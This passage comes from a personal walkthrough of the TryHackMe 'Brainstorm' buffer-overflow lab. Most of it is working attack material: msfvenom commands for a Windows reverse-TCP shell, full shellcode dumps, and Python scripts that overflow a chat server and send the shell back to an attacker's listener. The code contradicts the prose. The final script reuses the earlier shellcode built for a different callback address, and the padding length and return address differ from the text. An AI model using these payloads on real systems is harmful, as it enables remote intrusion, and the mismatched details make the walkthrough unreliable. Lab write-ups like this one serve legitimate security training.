    - `EXITFUNC=thread` =  More stable shell
    - `-f c` = File type C (C language)
    - `-a x86` = Architecture x86
    
    - **`-b "\x00"` bad characters!!!** 

        - Remeber, Vuln Server does not have `badchars` so, in this case, we only will use x00 Null Byte as a badchar.
        - Otherwise, add the other `badchar` here!

            - **IN CASE OF BADCHAR THE SYNTHAX IS:  `-b "\x00\x02\x66\xF1"`**
    
    - **Command:**
    
    - **`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`**
    
    - ![image](https://user-images.githubusercontent.com/94720207/169602921-162af03e-6b6f-4ef4-be8c-c86e2d71e5e6.png)

    - **BOOM!!! We just have generated `THE SHELLCODE` (++++ [in nomine dei nostri excelsi](https://youtu.be/j3_ew_pvPXE?t=292) ++++)

```
"\xbb\x1f\x19\xb5\xa8\xdb\xce\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x83\xc2\x04\x31\x5a\x0e\x03\x45\x17\x57\x5d\x85\xcf\x15"
"\x9e\x75\x10\x7a\x16\x90\x21\xba\x4c\xd1\x12\x0a\x06\xb7\x9e"
"\xe1\x4a\x23\x14\x87\x42\x44\x9d\x22\xb5\x6b\x1e\x1e\x85\xea"
"\x9c\x5d\xda\xcc\x9d\xad\x2f\x0d\xd9\xd0\xc2\x5f\xb2\x9f\x71"
"\x4f\xb7\xea\x49\xe4\x8b\xfb\xc9\x19\x5b\xfd\xf8\x8c\xd7\xa4"
"\xda\x2f\x3b\xdd\x52\x37\x58\xd8\x2d\xcc\xaa\x96\xaf\x04\xe3"
"\x57\x03\x69\xcb\xa5\x5d\xae\xec\x55\x28\xc6\x0e\xeb\x2b\x1d"
"\x6c\x37\xb9\x85\xd6\xbc\x19\x61\xe6\x11\xff\xe2\xe4\xde\x8b"
"\xac\xe8\xe1\x58\xc7\x15\x69\x5f\x07\x9c\x29\x44\x83\xc4\xea"
"\xe5\x92\xa0\x5d\x19\xc4\x0a\x01\xbf\x8f\xa7\x56\xb2\xd2\xaf"
"\x9b\xff\xec\x2f\xb4\x88\x9f\x1d\x1b\x23\x37\x2e\xd4\xed\xc0"
"\x51\xcf\x4a\x5e\xac\xf0\xaa\x77\x6b\xa4\xfa\xef\x5a\xc5\x90"
"\xef\x63\x10\x36\xbf\xcb\xcb\xf7\x6f\xac\xbb\x9f\x65\x23\xe3"
"\x80\x86\xe9\x8c\x2b\x7d\x7a\x73\x03\x7c\x38\x1b\x56\x7e\xad"
"\x87\xdf\x98\xa7\x27\xb6\x33\x50\xd1\x93\xcf\xc1\x1e\x0e\xaa"
"\xc2\x95\xbd\x4b\x8c\x5d\xcb\x5f\x79\xae\x86\x3d\x2c\xb1\x3c"
"\x29\xb2\x20\xdb\xa9\xbd\x58\x74\xfe\xea\xaf\x8d\x6a\x07\x89"
"\x27\x88\xda\x4f\x0f\x08\x01\xac\x8e\x91\xc4\x88\xb4\x81\x10"
"\x10\xf1\xf5\xcc\x47\xaf\xa3\xaa\x31\x01\x1d\x65\xed\xcb\xc9"
"\xf0\xdd\xcb\x8f\xfc\x0b\xba\x6f\x4c\xe2\xfb\x90\x61\x62\x0c"
"\xe9\x9f\x12\xf3\x20\x24\x32\x16\xe0\x51\xdb\x8f\x61\xd8\x86"
"\x2f\x5c\x1f\xbf\xb3\x54\xe0\x44\xab\x1d\xe5\x01\x6b\xce\x97"
"\x1a\x1e\xf0\x04\x1a\x0b"
```

- **We only need to paste it to our last python script and the world is us**  

- **In Kali Machine**

    - Again, We only need to copy that code and modify the last python script or make another new. 
    
    - **In my case, I will do another file called `666_INSANE_IN_THE_BRAINSTORM.py` with the last modification.**
    
        - I will do a new variable called `shellcode`
        
        - We will copy the whole shellcode **inside `()` WITHOUT THE `;` in a new variable called `overflow`**
        
        - NOTE: In this case we will not care about the payload size, but maybe there are scenarios with a very limited space (in this case was 4 bytes = "AAAA", so it's something to take care for the future Labs!)
        
            - ![image](https://user-images.githubusercontent.com/94720207/169603237-676bbf5a-9c20-4b33-81aa-c0ca16ed9581.png)
        
        - We also will add `+ overflow` at the line: `shellcode = "A" * 2003 + "\xAF\x11\x50\x62"` to get:
        
            - `shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + overflow` 
            
    - I will also add a padding: `b"\x90" * 32` (if a paddring doesn't work you can take another number and try changing the 32 making it smaller or bigger)


```python  
#!/usr/bin/python

import socket
import sys
    
username = b"fz3r0"
message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32

shellcode = (b"\xbb\x1f\x19\xb5\xa8\xdb\xce\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
b"\x52\x83\xc2\x04\x31\x5a\x0e\x03\x45\x17\x57\x5d\x85\xcf\x15"
b"\x9e\x75\x10\x7a\x16\x90\x21\xba\x4c\xd1\x12\x0a\x06\xb7\x9e"
b"\xe1\x4a\x23\x14\x87\x42\x44\x9d\x22\xb5\x6b\x1e\x1e\x85\xea"
b"\x9c\x5d\xda\xcc\x9d\xad\x2f\x0d\xd9\xd0\xc2\x5f\xb2\x9f\x71"
b"\x4f\xb7\xea\x49\xe4\x8b\xfb\xc9\x19\x5b\xfd\xf8\x8c\xd7\xa4"
b"\xda\x2f\x3b\xdd\x52\x37\x58\xd8\x2d\xcc\xaa\x96\xaf\x04\xe3"
b"\x57\x03\x69\xcb\xa5\x5d\xae\xec\x55\x28\xc6\x0e\xeb\x2b\x1d"
b"\x6c\x37\xb9\x85\xd6\xbc\x19\x61\xe6\x11\xff\xe2\xe4\xde\x8b"
b"\xac\xe8\xe1\x58\xc7\x15\x69\x5f\x07\x9c\x29\x44\x83\xc4\xea"
b"\xe5\x92\xa0\x5d\x19\xc4\x0a\x01\xbf\x8f\xa7\x56\xb2\xd2\xaf"
b"\x9b\xff\xec\x2f\xb4\x88\x9f\x1d\x1b\x23\x37\x2e\xd4\xed\xc0"
b"\x51\xcf\x4a\x5e\xac\xf0\xaa\x77\x6b\xa4\xfa\xef\x5a\xc5\x90"
b"\xef\x63\x10\x36\xbf\xcb\xcb\xf7\x6f\xac\xbb\x9f\x65\x23\xe3"
b"\x80\x86\xe9\x8c\x2b\x7d\x7a\x73\x03\x7c\x38\x1b\x56\x7e\xad"
b"\x87\xdf\x98\xa7\x27\xb6\x33\x50\xd1\x93\xcf\xc1\x1e\x0e\xaa"
b"\xc2\x95\xbd\x4b\x8c\x5d\xcb\x5f\x79\xae\x86\x3d\x2c\xb1\x3c"
b"\x29\xb2\x20\xdb\xa9\xbd\x58\x74\xfe\xea\xaf\x8d\x6a\x07\x89"
b"\x27\x88\xda\x4f\x0f\x08\x01\xac\x8e\x91\xc4\x88\xb4\x81\x10"
b"\x10\xf1\xf5\xcc\x47\xaf\xa3\xaa\x31\x01\x1d\x65\xed\xcb\xc9"
b"\xf0\xdd\xcb\x8f\xfc\x0b\xba\x6f\x4c\xe2\xfb\x90\x61\x62\x0c"
b"\xe9\x9f\x12\xf3\x20\x24\x32\x16\xe0\x51\xdb\x8f\x61\xd8\x86"
b"\x2f\x5c\x1f\xbf\xb3\x54\xe0\x44\xab\x1d\xe5\x01\x6b\xce\x97"
b"\x1a\x1e\xf0\x04\x1a\x0b")

try:        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',9999))      
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')
        s.recv(1024)
        s.send(message + shellcode + b'\r\n')    
        s.recv(1024)
        s.close()
        
except:
        print("X:\>Fz3r0.buffer_overflow> I went to hell and now I'm back with a treasure")
        sys.exit()
```

- `chmod +x` to make it executable

    - ![image](https://user-images.githubusercontent.com/94720207/169606819-56192b4f-8c4b-4f45-afee-914590478b10.png)

- Now on the Kali Machine:

    - I'm gonna setup a `netcat` listener using the port `4444`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169607294-785d5f85-1063-4723-b95c-2e0616971c5d.png)

- Finally:

    - **Run `Chat Server` as Admin** (we don't need `immunity debugger` this time, we are simulating the "final attack" to "the real server")
    
    - ![image](https://user-images.githubusercontent.com/94720207/169607138-d68b9d10-bc30-47e0-8c51-611f2fbd967d.png)
     
    - **And now...run the `666_INSANE_IN_THE_BRAINSTORM.py` muuaaahhahaha!** 
    
        - ![image](https://user-images.githubusercontent.com/94720207/169608282-170da54c-6b25-4c96-8a2e-7036cb256484.png)

    - **BOOOOM!!!!** We got root!! **(inside my own bare metal Windows 10)**
    
        - **Now that we exploited the program and we control the `EIP` and sent succesfully a reverse shell with root privs, it's time to make the jump to the "real server".**

---

### Exploiting the Remote Chat Server

- **This step is very easy, we have everything already done, we just need to point to a different `LHOST` and `LPORT` in the `msfvenom payload`**.

    - This is because I will have another IP in the Kali machine, because I will connect to the `THM VPN` and leave my local `192.168.1.0/24`

- **I will also change the IPv4 and PORT of the `python script`**.

    - This is because the script is pointing to my own bare metal Windows 10 (Where I broke the binary), now I need to point against the "real server" to perform the "real attack"   

- So...I will edit the past `msf-venom` payload to make a final shellcode pointing to LHOST and LPORT (my Kali machine).

- And then I will paste that shellcode to a new python script where I will edit the RHOST and RPORT too (The real Chat Server). 

- **msfvenom command:**
    
    - **`msfvenom -p windows/shell_reverse_tcp LHOST=10.6.123.13 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`**

- Payload shellcode:

   - ![image](https://user-images.githubusercontent.com/94720207/169632611-6cdec92b-1ba7-44d3-bc76-4ecd0cfa6be8.png)
 
```
"\xbe\xcf\xa7\xb1\x52\xdb\xc4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x77\x12\x83\xc7\x04\x03\xb8\xa9\x53\xa7\xba\x5e\x11"
"\x48\x42\x9f\x76\xc0\xa7\xae\xb6\xb6\xac\x81\x06\xbc\xe0\x2d"
"\xec\x90\x10\xa5\x80\x3c\x17\x0e\x2e\x1b\x16\x8f\x03\x5f\x39"
"\x13\x5e\x8c\x99\x2a\x91\xc1\xd8\x6b\xcc\x28\x88\x24\x9a\x9f"
"\x3c\x40\xd6\x23\xb7\x1a\xf6\x23\x24\xea\xf9\x02\xfb\x60\xa0"
"\x84\xfa\xa5\xd8\x8c\xe4\xaa\xe5\x47\x9f\x19\x91\x59\x49\x50"
"\x5a\xf5\xb4\x5c\xa9\x07\xf1\x5b\x52\x72\x0b\x98\xef\x85\xc8"
"\xe2\x2b\x03\xca\x45\xbf\xb3\x36\x77\x6c\x25\xbd\x7b\xd9\x21"
"\x99\x9f\xdc\xe6\x92\xa4\x55\x09\x74\x2d\x2d\x2e\x50\x75\xf5"
"\x4f\xc1\xd3\x58\x6f\x11\xbc\x05\xd5\x5a\x51\x51\x64\x01\x3e"
"\x96\x45\xb9\xbe\xb0\xde\xca\x8c\x1f\x75\x44\xbd\xe8\x53\x93"
"\xc2\xc2\x24\x0b\x3d\xed\x54\x02\xfa\xb9\x04\x3c\x2b\xc2\xce"
"\xbc\xd4\x17\x40\xec\x7a\xc8\x21\x5c\x3b\xb8\xc9\xb6\xb4\xe7"
"\xea\xb9\x1e\x80\x81\x40\xc9\xa5\x53\x31\x04\xd2\x59\xc5\x07"
"\x7e\xd7\x23\x4d\x6e\xb1\xfc\xfa\x17\x98\x76\x9a\xd8\x36\xf3"
"\x9c\x53\xb5\x04\x52\x94\xb0\x16\x03\x54\x8f\x44\x82\x6b\x25"
"\xe0\x48\xf9\xa2\xf0\x07\xe2\x7c\xa7\x40\xd4\x74\x2d\x7d\x4f"
"\x2f\x53\x7c\x09\x08\xd7\x5b\xea\x97\xd6\x2e\x56\xbc\xc8\xf6"
"\x57\xf8\xbc\xa6\x01\x56\x6a\x01\xf8\x18\xc4\xdb\x57\xf3\x80"
"\x9a\x9b\xc4\xd6\xa2\xf1\xb2\x36\x12\xac\x82\x49\x9b\x38\x03"
"\x32\xc1\xd8\xec\xe9\x41\xf8\x0e\x3b\xbc\x91\x96\xae\x7d\xfc"
"\x28\x05\x41\xf9\xaa\xaf\x3a\xfe\xb3\xda\x3f\xba\x73\x37\x32"
"\xd3\x11\x37\xe1\xd4\x33"
```
 
 - **msfvenom payload check!...Now, the python script:**
 
     - Target IPv4 Address: 

        - ![image](https://user-images.githubusercontent.com/94720207/169631011-989ecfcb-541b-4d68-8632-5e3a49b5fdc6.png)
    
    - Target Port:
        
        - Target:
        
            - **RHOST: `10.10.246.155`
            - **RPORT: `9999`
        
- **Python Script:** 

    - I will make another scritp called `0_Brainstorm_PWN.py` 

```python
#!/usr/bin/python

import socket
import sys
    
username = b"fz3r0"
message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32

shellcode = (b"\xbb\x1f\x19\xb5\xa8\xdb\xce\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
b"\x52\x83\xc2\x04\x31\x5a\x0e\x03\x45\x17\x57\x5d\x85\xcf\x15"
b"\x9e\x75\x10\x7a\x16\x90\x21\xba\x4c\xd1\x12\x0a\x06\xb7\x9e"
b"\xe1\x4a\x23\x14\x87\x42\x44\x9d\x22\xb5\x6b\x1e\x1e\x85\xea"
b"\x9c\x5d\xda\xcc\x9d\xad\x2f\x0d\xd9\xd0\xc2\x5f\xb2\x9f\x71"
b"\x4f\xb7\xea\x49\xe4\x8b\xfb\xc9\x19\x5b\xfd\xf8\x8c\xd7\xa4"
b"\xda\x2f\x3b\xdd\x52\x37\x58\xd8\x2d\xcc\xaa\x96\xaf\x04\xe3"
b"\x57\x03\x69\xcb\xa5\x5d\xae\xec\x55\x28\xc6\x0e\xeb\x2b\x1d"
b"\x6c\x37\xb9\x85\xd6\xbc\x19\x61\xe6\x11\xff\xe2\xe4\xde\x8b"
b"\xac\xe8\xe1\x58\xc7\x15\x69\x5f\x07\x9c\x29\x44\x83\xc4\xea"
b"\xe5\x92\xa0\x5d\x19\xc4\x0a\x01\xbf\x8f\xa7\x56\xb2\xd2\xaf"
b"\x9b\xff\xec\x2f\xb4\x88\x9f\x1d\x1b\x23\x37\x2e\xd4\xed\xc0"
b"\x51\xcf\x4a\x5e\xac\xf0\xaa\x77\x6b\xa4\xfa\xef\x5a\xc5\x90"
b"\xef\x63\x10\x36\xbf\xcb\xcb\xf7\x6f\xac\xbb\x9f\x65\x23\xe3"
b"\x80\x86\xe9\x8c\x2b\x7d\x7a\x73\x03\x7c\x38\x1b\x56\x7e\xad"
b"\x87\xdf\x98\xa7\x27\xb6\x33\x50\xd1\x93\xcf\xc1\x1e\x0e\xaa"
b"\xc2\x95\xbd\x4b\x8c\x5d\xcb\x5f\x79\xae\x86\x3d\x2c\xb1\x3c"
b"\x29\xb2\x20\xdb\xa9\xbd\x58\x74\xfe\xea\xaf\x8d\x6a\x07\x89"
b"\x27\x88\xda\x4f\x0f\x08\x01\xac\x8e\x91\xc4\x88\xb4\x81\x10"
b"\x10\xf1\xf5\xcc\x47\xaf\xa3\xaa\x31\x01\x1d\x65\xed\xcb\xc9"
b"\xf0\xdd\xcb\x8f\xfc\x0b\xba\x6f\x4c\xe2\xfb\x90\x61\x62\x0c"
b"\xe9\x9f\x12\xf3\x20\x24\x32\x16\xe0\x51\xdb\x8f\x61\xd8\x86"
b"\x2f\x5c\x1f\xbf\xb3\x54\xe0\x44\xab\x1d\xe5\x01\x6b\xce\x97"
b"\x1a\x1e\xf0\x04\x1a\x0b")

try:        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('10.10.246.155',9999))      
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')
        s.recv(1024)
        s.send(message + shellcode + b'\r\n')    
        s.recv(1024)
        s.close()
        
except:
        print("X:\>Fz3r0.buffer_overflow> I went to hell and now I'm back with a treasure")
        sys.exit()
```

- `chmod +x` to make it executable:

    -  


```
```
  

---

### References

- https://tryhackme.com/room/brainstorm
- https://github.com/Fz3r0/Fz3r0/blob/main/Cyber-Security-&-Hacking/Buffer-Overflow/buffer-overflow.md
- https://www.youtube.com/watch?v=T1-Sds8ZHBU
